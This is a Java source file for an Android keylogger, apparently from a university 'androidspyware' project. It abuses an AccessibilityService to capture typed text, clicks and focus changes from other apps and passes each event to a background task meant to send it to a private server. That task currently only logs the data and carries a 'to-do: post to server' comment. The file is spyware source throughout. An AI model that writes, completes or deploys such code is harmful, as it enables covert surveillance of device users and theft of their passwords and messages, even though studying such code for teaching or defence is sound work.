package edu.wisc.ece.androidspyware;

import android.accessibilityservice.AccessibilityService;
import android.os.AsyncTask;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import java.sql.Timestamp;

public class KeyLogger extends AccessibilityService {

    /**
     * This method is called whenever the user types, touches, or interacts with the device.
     * https://developer.android.com/reference/android/view/accessibility/AccessibilityEvent
     * https://developer.android.com/reference/java/security/Timestamp
     */
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // get the data that we may want to send back to our server
        String timestamp = new Timestamp(event.getEventTime()).toString();
        String data = event.getText().toString();

        // this is whenever the user changes the text in a textview
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            String payload = "[" + timestamp + "][TEXT_CHANGED] " + data;
            (new SendToServer()).execute(payload);
        // this is whenever the user clicks or launches apps
        } else if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            String payload = "[" + timestamp + "][VIEW_CLICKED]" + data;
            (new SendToServer()).execute(payload);
        // this is whenever the user changes focus of the app. (eg: clicking on a text view/button)
        } else if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
            String payload = "[" + timestamp + "][VIEW_FOCUSED]" + data;
            (new SendToServer()).execute(payload);
        }
    }

    @Override
    public void onInterrupt() { }

    /**
     * Background task to post information to our private server
     */
    private class SendToServer extends AsyncTask<String, Void, Void> {
        @Override
        protected Void doInBackground(String... params) {
            try {
                String payload = params[0];

                Log.d("KeyLogger", payload);

                //to-do: post to server
            } catch (Exception e) {
                e.printStackTrace();
            }

            return null;
        }
    }
}
